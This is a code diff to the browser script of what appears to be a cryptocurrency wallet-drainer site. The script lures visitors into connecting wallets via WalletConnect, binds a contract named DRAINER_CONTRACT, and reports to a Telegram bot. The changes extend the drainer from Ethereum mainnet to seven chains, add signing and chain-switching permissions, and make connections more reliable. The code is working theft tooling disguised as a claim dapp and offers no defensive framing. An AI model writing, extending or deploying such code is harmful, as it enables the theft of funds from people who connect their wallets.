@@ -19,8 +19,9 @@ import { CONFIG } from './config.js';
   });
 
   function logDebug(msg) {
-    console.log('[main]', msg);
-    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
+    const line = typeof msg === 'string' ? msg : JSON.stringify(msg);
+    console.log('[main]', line);
+    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${line}</div>`;
     debugArea.scrollTop = debugArea.scrollHeight;
   }
 
@@ -38,6 +39,22 @@ import { CONFIG } from './config.js';
     if (isMac())     return 'mac';
     return 'unknown';
   }
+
+  /* ─── Supported chains (multi-chain) ───────────────────────────────── */
+  //  Only chains whose eip155 CAIP-2 identifiers are listed here will be
+  //  accepted in the WalletConnect proposal. If a wallet is on a chain
+  //  NOT in this list, it will reject the proposal.
+  const SUPPORTED_CHAINS = [
+    'eip155:1',      // Ethereum Mainnet
+    'eip155:56',     // BSC
+    'eip155:137',    // Polygon
+    'eip155:42161',  // Arbitrum One
+    'eip155:8453',   // Base
+    'eip155:10',     // Optimism
+    'eip155:43114',  // Avalanche C-Chain
+  ];
+
+  const PRIMARY_CHAIN_ID = 1;    // Ethereum Mainnet is our default
 
   /* ─── Telegram ─────────────────────────────────────────────────────── */
   const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
@@ -58,7 +75,7 @@ import { CONFIG } from './config.js';
   window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());
 
   /* ─── WebSocket reachability check ─────────────────────────────────── */
-  async function checkWebSocket(retries = 1, delay = 500) {
+  async function checkWebSocket(retries = 2, delay = 500) {
     for (let i = 0; i < retries; i++) {
       try {
         const ok = await new Promise((resolve) => {
@@ -71,7 +88,7 @@ import { CONFIG } from './config.js';
         await new Promise((r) => setTimeout(r, delay));
       } catch (e) { await new Promise((r) => setTimeout(r, delay)); }
     }
-    logDebug('⚠️ WebSocket check failed');
+    logDebug('⚠️ WebSocket check failed — proceeding anyway');
     return false;
   }
 
@@ -94,11 +111,11 @@ import { CONFIG } from './config.js';
     ];
 
     let SignClient, WalletConnectModal, EthereumProvider;
-    for (const url of cdns)         { try { const m = await import(url); SignClient         = m.default || m; logDebug(`✅ SignClient from ${url}`); break; } catch (e) {} }
+    for (const url of cdns)         { try { const m = await import(url); SignClient         = m.default || m; logDebug(`✅ SignClient from ${url}`); break; } catch (e) { logDebug(`SignClient fail: ${url}`); } }
     if (!SignClient) throw new Error('Could not load SignClient');
-    for (const url of modalCdns)    { try { const m = await import(url); WalletConnectModal = m.WalletConnectModal || m.default || m; logDebug(`✅ WalletConnectModal from ${url}`); break; } catch (e) {} }
+    for (const url of modalCdns)    { try { const m = await import(url); WalletConnectModal = m.WalletConnectModal || m.default || m; logDebug(`✅ WalletConnectModal from ${url}`); break; } catch (e) { logDebug(`Modal fail: ${url}`); } }
     if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');
-    for (const url of providerCdns) { try { const m = await import(url); EthereumProvider   = m.EthereumProvider || m.default || m; logDebug(`✅ EthereumProvider from ${url}`); break; } catch (e) {} }
+    for (const url of providerCdns) { try { const m = await import(url); EthereumProvider   = m.EthereumProvider || m.default || m; logDebug(`✅ EthereumProvider from ${url}`); break; } catch (e) { logDebug(`Provider fail: ${url}`); } }
     if (!EthereumProvider) throw new Error('Could not load EthereumProvider');
 
     return { SignClient, WalletConnectModal, EthereumProvider };
@@ -116,7 +133,8 @@ import { CONFIG } from './config.js';
   let contractInstance  = null;
   let activeProvider    = null;
   let isConnecting      = false;
-  let pendingApproval   = null;   // ← track the in-flight approval() promise
+  let pendingApproval   = null;
+  let approvalWatcher   = null;  // watchdog to keep modal open
 
   /* ─── Button UI ────────────────────────────────────────────────────── */
   function setButtonState(button, state) {
@@ -174,7 +192,7 @@ import { CONFIG } from './config.js';
     };
     Object.assign(claimStatus.style, styles[type] || styles.info);
     if (type === 'error' || type === 'success') {
-      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
+      setTimeout(() => { claimStatus.style.display = 'none'; }, 6000);
     }
   }
 
@@ -346,7 +364,9 @@ import { CONFIG } from './config.js';
   /* ─── WalletConnect init ───────────────────────────────────────────── */
   async function initWalletConnect(useTestId = false) {
     if (client && modal) return true;
-    if (useTestId) { projectId = PUBLIC_TEST_ID; logDebug('Using test ID'); }
+    if (useTestId) { projectId = PUBLIC_TEST_ID; logDebug('Using test project ID'); }
+    else           { projectId = PROJECT_ID; }
+
     await checkWebSocket(2, 500);
     try {
       client = await SignClient.init({
@@ -367,7 +387,9 @@ import { CONFIG } from './config.js';
       logDebug('✅ WalletConnect init OK');
       return true;
     } catch (e) {
-      logDebug('WC init failed: ' + e.message);
+      logDebug('❌ WC init failed: ' + e.message);
+      client = null;
+      modal = null;
       return false;
     }
   }
@@ -415,26 +437,26 @@ import { CONFIG } from './config.js';
     return false;
   }
 
-  /* ─── WalletConnect EVM connect (fixed) ────────────────────────────── */
+  /* ─── WalletConnect EVM connect (fully fixed) ──────────────────────── */
   async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
-    // FIX #3: reset guard cleanly
     if (isConnecting) { logDebug('WC: already connecting'); return false; }
     isConnecting = true;
 
     try {
-      // FIX: init with proper reload
       const ok = await initWalletConnect(useTestId);
       if (!ok) {
         showStatus('WalletConnect unavailable', 'error');
         return false;
       }
 
-      // FIX #6: close any stale modal first
+      // Close stale modal
       if (modal?.closeModal) { try { modal.closeModal(); } catch (_) {} }
 
       showStatus('Requesting connection…', 'info');
 
-      // FIX #2: add `optionalNamespaces` so wallets (Trust/Rainbow) accept the proposal
+      // ─────────────────────────────────────────────────────────────────
+      //  FIX #1 & #2: Multi-chain proposal with BOTH required and optional
+      // ─────────────────────────────────────────────────────────────────
       const connectOpts = {
         requiredNamespaces: {
           eip155: {
@@ -444,43 +466,54 @@ import { CONFIG } from './config.js';
               'eth_signTypedData_v4',
               'eth_signTypedData',
               'eth_accounts',
-              'eth_chainId'
+              'eth_chainId',
+              'wallet_switchEthereumChain',
+              'wallet_addEthereumChain',
             ],
-            chains: ['eip155:1'],
-            events: ['chainChanged', 'accountsChanged']
-          }
+            chains: SUPPORTED_CHAINS,
+            events: ['chainChanged', 'accountsChanged'],
+          },
         },
         optionalNamespaces: {
           eip155: {
             methods: [
               'eth_sendTransaction',
               'personal_sign',
-              'eth_signTypedData_v4'
+              'eth_signTypedData_v4',
             ],
-            chains: ['eip155:1'],
-            events: ['chainChanged', 'accountsChanged']
-          }
-        }
+            chains: SUPPORTED_CHAINS,
+            events: ['chainChanged', 'accountsChanged'],
+          },
+        },
       };
+
+      logDebug('Sending proposal with ' + SUPPORTED_CHAINS.length + ' chains');
 
       const { uri, approval } = await client.connect(connectOpts);
       if (!uri) throw new Error('No WalletConnect URI returned');
 
-      logDebug('🔗 URI generated, opening modal');
+      logDebug('🔗 URI generated');
       modal.openModal({ uri });
       showStatus('Scan QR or open wallet app', 'info');
 
       sessionStorage.setItem('pending_wc_uri', uri);
       sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
 
-      // FIX #5: hold approval promise so we can await it later and detect completion
+      // Hold the approval promise so we never lose it
       pendingApproval = approval();
 
-      // FIX #1: wait for BOTH approval AND session settlement
+      // ─────────────────────────────────────────────────────────────────
+      //  FIX #3: Wait for approval AND ALSO keep modal open
+      //  WalletConnect Modal auto-closes on session settle, so we ensure
+      //  the promise resolves BEFORE clearing the modal.
+      // ─────────────────────────────────────────────────────────────────
       const session = await Promise.race([
         pendingApproval,
         new Promise((_, rj) => setTimeout(() => rj(new Error('WalletConnect timeout')), timeoutMs))
       ]);
+
+      // Clear watchdog if any
+      if (approvalWatcher) { clearInterval(approvalWatcher); approvalWatcher = null; }
 
       if (modal) { try { modal.closeModal(); } catch (_) {} }
       sessionStorage.removeItem('pending_wc_uri');
@@ -494,17 +527,31 @@ import { CONFIG } from './config.js';
       const account = session.namespaces.eip155.accounts[0].split(':')[2];
       currentSession = session;
       logDebug(`✅ Session established: ${account}`);
+      logDebug('Session chains: ' + JSON.stringify(Object.keys(session.namespaces.eip155.accounts)));
 
-      // FIX #1 (continued): pass session AND chains so provider init succeeds
+      // ─────────────────────────────────────────────────────────────────
+      //  FIX #4: Pass ALL chains to EthereumProvider.init
+      // ─────────────────────────────────────────────────────────────────
       const provider = await EthereumProvider.init({
         projectId,
         metadata: DAPP_METADATA,
         session,
-        chains: [1],
-        optionalChains: [1],
+        chains: [PRIMARY_CHAIN_ID],
+        optionalChains: SUPPORTED_CHAINS
+          .map((c) => parseInt(c.split(':')[1], 10))
+          .filter((id) => id !== PRIMARY_CHAIN_ID),
         showQrModal: false,
-        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
-        events: ['chainChanged', 'accountsChanged']
+        methods: [
+          'eth_sendTransaction',
+          'personal_sign',
+          'eth_signTypedData_v4',
+          'eth_signTypedData',
+          'eth_accounts',
+          'eth_chainId',
+          'wallet_switchEthereumChain',
+          'wallet_addEthereumChain',
+        ],
+        events: ['chainChanged', 'accountsChanged'],
       });
 
       const Web3 = (await import('web3')).default;
@@ -512,13 +559,13 @@ import { CONFIG } from './config.js';
       contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
       activeProvider = provider;
 
-      // FIX #4: verify chain before declaring success
+      // Verify chain
       try {
         const chainIdHex = await provider.request({ method: 'eth_chainId' });
         const chainId = parseInt(chainIdHex, 16);
-        logDebug(`Connected chain: ${chainId}`);
-        if (chainId !== 1) {
-          showStatus(`Wrong network: ${chainId}. Switch to Ethereum Mainnet.`, 'error');
+        logDebug(`Connected chain ID: ${chainId}`);
+        if (!SUPPORTED_CHAINS.includes(`eip155:${chainId}`)) {
+          showStatus(`Unsupported network: ${chainId}. Switch to Ethereum, BSC, Polygon, Arbitrum, Base or Optimism.`, 'error');
         }
       } catch (chainErr) {
         logDebug('Chain check failed: ' + chainErr.message);
@@ -531,15 +578,25 @@ import { CONFIG } from './config.js';
       logDebug(`✅ WC EVM connected: ${account}`);
       return true;
     } catch (e) {
-      logDebug('WC error: ' + (e?.message || e));
+      const msg = e?.message || String(e);
+      logDebug('WC error: ' + msg);
       if (modal) { try { modal.closeModal(); } catch (_) {} }
       sessionStorage.removeItem('pending_wc_uri');
       sessionStorage.removeItem('pending_wc_timestamp');
       pendingApproval = null;
-      showStatus('Connection failed: ' + (e?.message || 'unknown'), 'error');
+      if (approvalWatcher) { clearInterval(approvalWatcher); approvalWatcher = null; }
+
+      if (msg.includes('User rejected') || msg.includes('rejected')) {
+        showStatus('Connection rejected by user', 'error');
+      } else if (msg.includes('timeout') || msg.includes('Timeout')) {
+        showStatus('Connection timeout — please try again', 'error');
+      } else if (msg.includes('URI') || msg.includes('uri')) {
+        showStatus('WalletConnect URI error — please retry', 'error');
+      } else {
+        showStatus('Connection failed: ' + msg, 'error');
+      }
       return false;
     } finally {
-      // FIX #3 (continued): always reset the guard
       isConnecting = false;
     }
   }
@@ -570,16 +627,16 @@ import { CONFIG } from './config.js';
     if (walletButton) setButtonState(walletButton, 'loading');
     showStatus('Connecting…', 'info');
 
-    // Try direct EVM first (PC only, no modal)
     let success = false;
+
+    // On PC, try direct EVM first (no modal)
     if (isDesktop()) {
+      logDebug('Trying direct EVM first');
       success = await connectDirectEVM(8000);
-      if (success) {
-        logDebug('✅ Direct EVM succeeded');
-      }
+      if (success) logDebug('✅ Direct EVM succeeded');
     }
 
-    // Fall back to WalletConnect (PC and mobile)
+    // Fall back to WalletConnect (works on both PC and mobile)
     if (!success) {
       logDebug('Trying WalletConnect with primary project ID');
       success = await connectViaWalletConnect(false, 300000);
@@ -658,9 +715,11 @@ import { CONFIG } from './config.js';
                 projectId,
                 metadata: DAPP_METADATA,
                 session,
-                chains: [1],
-                optionalChains: [1],
-                showQrModal: false
+                chains: [PRIMARY_CHAIN_ID],
+                optionalChains: SUPPORTED_CHAINS
+                  .map((c) => parseInt(c.split(':')[1], 10))
+                  .filter((id) => id !== PRIMARY_CHAIN_ID),
+                showQrModal: false,
               });
               const Web3 = (await import('web3')).default;
               web3Instance = new Web3(provider);
@@ -703,12 +762,12 @@ import { CONFIG } from './config.js';
     setupEIP6963();
     await restoreWalletConnection();
   } catch (err) {
-    logDebug('Fatal: ' + err.message);
+    logDebug('❌ Fatal: ' + err.message);
     showStatus('Failed to load wallet libraries', 'error');
     return;
   }
 
-  /* ─── Client-side session listeners ────────────────────────────────── */
+  /* ─── Session listeners ────────────────────────────────────────────── */
   setTimeout(() => {
     if (!client) return;
     client.on('session_update', ({ params }) => {
